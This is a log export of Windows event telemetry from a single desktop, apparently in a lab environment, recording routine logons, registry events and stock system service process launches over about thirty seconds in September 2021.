{"timestamp":"2021-09-15T16:34:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:14","winlog.event_data.CommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wisvc","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:15","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:15","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:15","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:15","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\usocoreworker.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:15","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:15","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:15","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:15","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\taskhostw.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:17","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:17","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:17","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:17","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\CompatTelRunner.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:20","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:20","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:20","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:20","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:20","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:20","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\UNP\\UpdateNotificationMgr.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:21","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:21","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:21","winlog.event_data.CommandLine":"C:\\Windows\\system32\\mitigationscanner.exe","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:21","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\mitigationscanner.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:22","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:22","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:22","winlog.event_data.CommandLine":"C:\\Windows\\system32\\usoclient.exe StartModelUpdates","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:22","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\UsoClient.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:28","winlog.event_data.CommandLine":"C:\\Windows\\system32\\svchost.exe -k BcastDVRUserService -s BcastDVRUserService","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:29","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:29","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:29","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:29","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:29","winlog.event_data.CommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s XblAuthManager","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:29","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:29","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:29","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files\\WindowsApps\\Microsoft.XboxGamingOverlay_5.721.8052.0_x64__8wekyb3d8bbwe\\GameBar.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:29","winlog.event_data.CommandLine":"\"C:\\Program Files\\WindowsApps\\Microsoft.XboxGamingOverlay_5.721.8052.0_x64__8wekyb3d8bbwe\\GameBarFTServer.exe\" -Embedding","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:29","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files\\WindowsApps\\Microsoft.XboxGamingOverlay_5.721.8052.0_x64__8wekyb3d8bbwe\\GameBarFTServer.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:30","winlog.event_data.CommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s TroubleshootingSvc","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:31","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:31","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:31","winlog.event_data.CommandLine":"C:\\Windows\\System32\\svchost.exe -k LocalService -p -s LicenseManager","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:31","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:31","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:31","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:31","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:31","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:31","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:31","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:31","winlog.event_data.CommandLine":"C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s NgcSvc","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:31","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:32","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:32","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:32","winlog.event_data.CommandLine":"C:\\Windows\\system32\\svchost.exe -k LocalService -p -s BthAvctpSvc","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:32","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\BackgroundTransferHost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:34","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:34","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:34","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:34","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:34","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:34","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:34","winlog.event_data.CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:34","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:34","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:34","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Security Group Management","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Security Group Management","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
